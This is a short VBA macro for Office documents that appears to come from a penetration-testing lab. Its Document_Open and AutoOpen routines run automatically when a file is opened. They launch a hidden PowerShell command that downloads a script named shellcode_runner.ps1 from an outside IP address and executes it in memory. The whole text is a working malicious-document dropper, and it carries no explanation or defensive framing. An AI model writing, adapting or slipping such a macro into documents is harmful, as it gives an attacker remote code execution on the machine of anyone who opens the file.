Sub DownExec()
    Dim str as String
    str = "powershell (New-Object System.Net.WebClient).DownloadString('http://192.168.49.84/shellcode_runner.ps1')|IEX"
    Shell str, vbHide
End Sub

Sub Document_Open()
    DownExec
End Sub

Sub AutoOpen()
    DownExec
End Sub
